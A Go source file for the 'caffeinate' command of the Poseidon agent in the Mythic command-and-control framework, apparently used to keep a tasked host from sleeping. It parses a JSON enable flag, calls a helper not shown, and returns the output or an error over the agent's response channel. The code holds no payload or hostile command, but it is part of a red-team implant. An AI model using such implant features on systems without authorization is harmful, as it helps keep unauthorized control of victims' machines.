package caffeinate

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type CaffeinateRun interface {
	Success() bool
	Result() string
}

type Arguments struct {
	Enable bool `json:"enable"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	r, err := runCommand(args.Enable)
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	msg.UserOutput = r.Result()
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
